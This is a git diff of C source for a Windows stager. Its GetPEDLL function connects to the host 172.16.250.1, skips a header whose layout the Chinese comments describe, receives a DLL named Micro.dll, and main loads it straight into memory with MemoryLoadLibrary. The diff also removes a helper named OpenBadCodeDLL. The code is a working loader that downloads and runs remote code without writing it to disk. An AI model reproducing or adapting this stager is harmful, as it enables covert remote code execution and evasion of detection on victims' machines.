@@ -11,6 +11,7 @@ typedef VOID(*msg)(VOID);
 PBYTE bFileBuffer = NULL;
 
 
+
 BOOL GetPEDLL() {
 
 	DWORD dwError;
@@ -40,6 +41,7 @@ BOOL GetPEDLL() {
 	sin.sin_port = htons(sListenPort);
 	sin.sin_addr.S_un.S_addr = inet_addr("172.16.250.1");
 
+
 	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
 	{
 		dwError = GetLastError();
@@ -48,16 +50,23 @@ BOOL GetPEDLL() {
 	}
 
 	int ret = 0;
-	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
+	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
+	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
+	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
+	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
+	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
 	ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
-	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
-	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
-	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
-
 	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
 
 
-	ret = recv(socks, (PCHAR)bFileBuffer, 8712, NULL);
+	//传送四个数据还有\x00分隔符
+	ret = recv(socks, (PCHAR)bFileBuffer,5, NULL); 
+
+
+	//传送LibraryName还有\x00分隔符，由于我将LibraryName设置为了Micro.dll，有9个字符，需要九个字节来传输，再加上一个分隔符就是十个字节。
+	ret = recv(socks, (PCHAR)bFileBuffer,10, NULL);
+	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
+	ret = recv(socks, (PCHAR)bFileBuffer, 8704, NULL);
 
 	if (ret > 0)
 	{
@@ -68,20 +77,6 @@ BOOL GetPEDLL() {
 	return TRUE;
 }
 
-// 打开文件并获取大小
-DWORD OpenBadCodeDLL(HANDLE& hBadCodeDll, LPCWSTR lpwszBadCodeFileName) {
-	DWORD dwHighFileSize = 0;
-	DWORD dwLowFileSize = 0;
-	// 打开文件
-	hBadCodeDll = CreateFile(lpwszBadCodeFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hBadCodeDll == INVALID_HANDLE_VALUE) {
-		return GetLastError();
-	}
-	dwLowFileSize = GetFileSize(hBadCodeDll, &dwHighFileSize);
-	return dwLowFileSize;
-}
-
-
 int main()
 {
 
@@ -90,7 +85,7 @@ int main()
 	bFileBuffer = new BYTE[PAYLOAD_SIZE];
 	GetPEDLL();
 	// 导入PE文件
-	hModule = MemoryLoadLibrary(bFileBuffer,8712);
+	hModule = MemoryLoadLibrary(bFileBuffer, 8704);
 	// 如果加载失败，就退出
 	if (hModule == NULL) {
 		delete[] bFileBuffer;
